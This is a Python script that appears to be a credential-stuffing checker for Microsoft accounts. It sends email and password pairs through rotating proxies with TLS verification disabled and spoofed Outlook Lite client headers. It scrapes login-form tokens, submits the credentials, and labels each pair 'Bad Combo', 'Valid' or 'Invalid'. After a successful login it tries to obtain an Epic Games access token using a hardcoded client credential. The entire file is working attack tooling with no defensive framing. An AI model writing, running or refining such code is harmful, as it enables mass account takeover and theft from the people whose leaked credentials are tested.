import uuid
import random
import aiohttp
import asyncio
import ssl
from enum import Enum

class ProxyType(Enum):
    HTTP = 1
    SOCKS4 = 2
    SOCKS5 = 3

async def check_microsoft_login(email, password, proxy, proxy_type):
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        if proxy and proxy_type:
            if proxy_type == ProxyType.HTTP:
                proxy_url = f"http://{proxy}"
            elif proxy_type == ProxyType.SOCKS4:
                proxy_url = f"socks4://{proxy}"
            elif proxy_type == ProxyType.SOCKS5:
                proxy_url = f"socks5://{proxy}"
            else:
                raise ValueError("Invalid proxy type")
        else:
            proxy_url = None

        headers = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "X-Office-Application": "145",
            "X-OneAuth-Version": "1.83.0",
            "X-Office-Platform": "Android",
            "X-Office-Platform-Version": "28",
            "Enlightened-Hrd-Client": "0",
            "X-OneAuth-AppId": "com.microsoft.outlooklite",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive"
        }

        retry = 0
        while retry < 3:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                        vm = await response.text()

                    if any(x in vm for x in ["Neither", "Both", "Placeholder", "orgId"]):
                        return "Bad Combo"
                    elif "MSAccount" in vm:
                        ua = aiohttp.http.SERVER_SOFTWARE
                        headers.update({
                            "User-Agent": ua,
                            "Pragma": "no-cache",
                            "Accept": "*/*"
                        })

                        async with session.get("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=6b3dac1d-511d-4188-b691-b2578906c67a&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAA3MOYKCMAAAwL_YUkQgiBZbBOUW5DbQAXJLOBYx8PrdecAcBHFrTORdVynm74O_JT13RXSjVfS1EVl0ETix0epdK2JF2Nd0OzKmNlZAN-ZplB9Oa0U2zBOdx8fT4CVIH1RwKe8-VE324dfsyOUqGKh76nA4I61P_4d5aUpXrILeoXrehUZtuUVmk8ieJ4khmxvRIPba5Rx8dexEbLBaog8YRx2ohAF7tDjctYu8ZjLIVilsetu8kBf3JkaDHbnczeuKSMvdrPxRiCDftKtcbO5gRkzqSVnDQ_8mNfSX698ILFRBD6i6ibWA52v8DI6Lb3DfqzgVn-eAFMN2UvqPDOskxfNRq1Fbh11bhYInkxI0RCh4xa4B7LwJKPhT8UwfKLu2ez6V0suEYBIwsFw5n_3-HP4AykxFhW4BAAA&msaoauth2=true&lc=1033&sso_reload=true", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                            auth_response = await response.text()

                        epct = parse_value(auth_response, "epct=", "\\")
                        uaid = parse_value(auth_response, "uaid=", "\\u0026")
                        state = parse_value(auth_response, "state=", "\\u0026")
                        client_id = parse_value(auth_response, "https://login.live.com/oauth20_authorize.srf?client_id=", "\\u0026")

                        headers.update({
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Referer": "https://login.microsoftonline.com/",
                            "Sec-Fetch-Dest": "document",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Site": "same-origin",
                            "Upgrade-Insecure-Requests": "1",
                            "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": "\"Windows\""
                        })

                        async with session.get(f"https://login.live.com/oauth20_authorize.srf?client_id={client_id}&scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&response_type=code&state={state}&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&epct={epct}&jshs=0&username={email}&login_hint={email}", headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                            login_page = await response.text()

                        ppft = parse_value(login_page, "<input type=\"hidden\" name=\"PPFT\" id=\"i0327\" value=\"", "\"/>")
                        urlpost = parse_value(login_page, ",urlPost:'", "'")

                        headers.update({
                            "Accept-Encoding": "gzip, deflate, br, zstd",
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Host": "login.live.com",
                            "Origin": "https://login.live.com",
                            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&scope=service%3a%3aaccount.microsoft.com%3a%3aMBI_SSL+openid+profile+offline_access&redirect_uri=https%3a%2f%2faccount.microsoft.com%2fauth%2fcomplete-signin-oauth&response_type=code&state=H4sIAAAAAAAEAA3MOYKCMAAAwL_YUkQgiBZbBOUW5DbQAXJLOBYx8PrdecAcBHFrTORdVynm74O_JT13RXSjVfS1EVl0ETix0epdK2JF2Nd0OzKmNlZAN-ZplB9Oa0U2zBOdx8fT4CVIH1RwKe8-VE324dfsyOUqGKh76nA4I61P_4d5aUpXrILeoXrehUZtuUVmk8ieJ4khmxvRIPba5Rx8dexEbLBaog8YRx2ohAF7tDjctYu8ZjLIVilsetu8kBf3JkaDHbnczeuKSMvdrPxRiCDftKtcbO5gRkzqSVnDQ_8mNfSX698ILFRBD6i6ibWA52v8DI6Lb3DfqzgVn-eAFMN2UvqPDOskxfNRq1Fbh11bhYInkxI0RCh4xa4B7LwJKPhT8UwfKLu2ez6V0suEYBIwsFw5n_3-HP4AykxFhW4BAAA&prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=6b3dac1d511d4188b691b2578906c67a&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&epct={epct}&jshs=0&username={email}&login_hint={email}"
                        })

                        data = {
                            "login": email,
                            "loginfmt": email,
                            "passwd": password,
                            "PPFT": ppft,
                            "PPSX": "Passpor",
                            "NewUser": "1",
                            "Type": "11",
                            "LoginOptions": "1",
                            "i3": str(random.randint(1, 100000)),
                            "m1": str(random.randint(1, 100000)),
                            "i12": "1",
                            "i17": str(random.randint(1, 100000)),
                            "i18": "__Login_Strings|1,__Login_Core|1,"
                        }

                        async with session.post(urlpost, headers=headers, data=data, proxy=proxy_url, ssl=ssl_context) as response:
                            login_response = await response.text()

                        if "success" in login_response:
                            epic_url = "https://www.epicgames.com/id/api/redirect"
                            async with session.get(epic_url, headers=headers, proxy=proxy_url, ssl=ssl_context) as response:
                                epic_response = await response.text()

                            code = parse_value(epic_response, "authorizationCode\":\"", "\"")
                            epic_token_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
                            
                            headers.update({
                                "Authorization": "basic M2xvZ29uc2xkZmdna3Nqb2xsZWxncGtmcXFhMzFqYXRoZTg6MDkyMjk5ZmItMzdmYy00ZThkLTk0YTItNmU4N2NkMGY4YjA5",
                                "Content-Type": "application/x-www-form-urlencoded"
                            })

                            data = {
                                "grant_type": "authorization_code",
                                "code": code,
                                "token_type": "eg1"
                            }

                            async with session.post(epic_token_url, headers=headers, data=data, proxy=proxy_url, ssl=ssl_context) as response:
                                token_response = await response.json()

                            if "access_token" in token_response:
                                return "Valid"
                            else:
                                return "Invalid"
                        else:
                            return "Invalid"
                    else:
                        return "Invalid"
            except Exception as e:
                retry += 1
                if retry == 3:
                    return f"Error: {str(e)}"
                await asyncio.sleep(1)
    except Exception as e:
        return f"Error: {str(e)}"

def parse_value(text, start, end):
    try:
        return text.split(start)[1].split(end)[0]
    except:
        return ""

# Example usage in main.py
async def main():
    email = "example@email.com"
    password = "password123"
    proxy = "127.0.0.1:8080"
    proxy_type = ProxyType.HTTP

    result = await check_microsoft_login(email, password, proxy, proxy_type)
    print(f"Login result: {result}")

if __name__ == "__main__":
    asyncio.run(main())
